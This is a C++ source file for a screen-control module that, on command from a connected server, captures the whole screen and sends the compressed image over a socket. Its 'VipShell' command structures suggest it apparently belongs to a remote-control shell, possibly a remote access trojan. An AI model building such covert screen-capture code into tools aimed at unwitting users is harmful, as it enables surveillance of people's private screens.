#include ".\screencontrolproc.h"

CScreenControlProc::CScreenControlProc(void)
{
	m_dwStartTime = GetTickCount();
}

CScreenControlProc::~CScreenControlProc(void)
{

}


void CScreenControlProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 1; 
	SendInfo.dw1 = m_dwConnectId;
//	memcpy(SendInfo.pBuff, m_pSysinfo, sizeof(tagServerSystemInfo));
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

void CScreenControlProc::OnCmd_GetScreen(tagVipShellCmd* info)
{
	if ( GetTickCount() - m_dwStartTime > 3000 )
	{
		m_hDesktop._CloseDesktop();
		m_hDesktop._OpenDesktop();
		m_dwStartTime = GetTickCount();
	}
	
	tagVipShellCmd SendInfo;
	m_hScreen.SetBitCount(info->dw1);
	RECT rcScreen;
	rcScreen.left = 0;
	rcScreen.top = 0;
	rcScreen.right = GetSystemMetrics(SM_CXSCREEN);
	rcScreen.bottom = GetSystemMetrics(SM_CYSCREEN);
	m_hScreen.LockData(false);
	if( !m_hScreen.CopyScreenToData(&rcScreen) )
	{
		//失败
		SendInfo.dwCmd = CMD_ERROR;
		m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
		return ;
	}
	DWORD dwLzw = 0;
	DWORD dwLen = 0;
	BYTE* bBuf = NULL;
	m_hScreen.GetDataSource(NULL, &dwLen, &bBuf, &dwLzw);
	if( bBuf == 0 || dwLzw == 0 || dwLen == 0)
	{
		//失败
		SendInfo.dwCmd = CMD_ERROR;
		m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
		return ;
	}
	SendInfo.dwCmd = CMD_ISOK;
	SendInfo.dw1 = dwLzw;
	SendInfo.dw2 = dwLen;
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	int nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if( nRet == SOCKET_ERROR)
			return ;
	//传给连接
	nRet = _SendBuffData(bBuf, dwLzw);
	if( nRet == SOCKET_ERROR)
		m_hServer->Close();
}
void CScreenControlProc::SetConnectId(DWORD dwId)
{
	m_dwConnectId = dwId;
}
